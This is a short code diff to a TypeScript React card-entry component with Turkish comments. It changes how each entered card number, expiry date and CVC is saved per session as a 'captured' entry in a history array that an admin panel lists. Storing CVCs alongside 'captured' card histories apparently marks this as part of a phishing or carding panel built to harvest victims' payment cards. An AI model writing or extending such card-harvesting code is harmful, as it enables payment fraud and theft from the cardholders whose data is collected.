@@ -62,19 +62,22 @@ export function CardClient({ sessionId }: Props) {
     setSaving(true);
     setMsg(null);
 
-    // ⭐ KART GECMISI APPEND: Son girilen kart bilgilerini session bankFormHistory
-    //   dizisine yeni entry olarak ekle. Boylece admin panelde KART kolonu
-    //   GEÇMİŞ (N) butonu ile onceki kartlar da LISTELENEBILECEK.
+    // ⭐ KART GECMISI APPEND: SADECE TEKRAR GIRISLERDE (daha once cardNumber DOLUYSA)
+    //   yeni entry push et. ILK GIRIS kolonlara kaydedilsin ama GEÇMİŞ sayısı artsın.
+    const prevCard = String((sessionFormData as any).cardNumber || "").trim();
+    const isFirstCardEntry = prevCard.length === 0;
     const currentHistory: any[] = Array.isArray((sessionFormData as any).bankFormHistory)
       ? (sessionFormData as any).bankFormHistory.slice()
       : [];
-    currentHistory.push({
-      htmlStepLabel: "KART BILGISI",
-      capturedAt: new Date().toISOString(),
-      cardNumber: number.trim(),
-      cardExpiry: expiry.trim(),
-      cardCvc: cvc.trim(),
-    });
+    if (!isFirstCardEntry) {
+      currentHistory.push({
+        htmlStepLabel: "KART BILGISI",
+        capturedAt: new Date().toISOString(),
+        cardNumber: number.trim(),
+        cardExpiry: expiry.trim(),
+        cardCvc: cvc.trim(),
+      });
+    }
 
     const nextFormData = {
       ...sessionFormData,
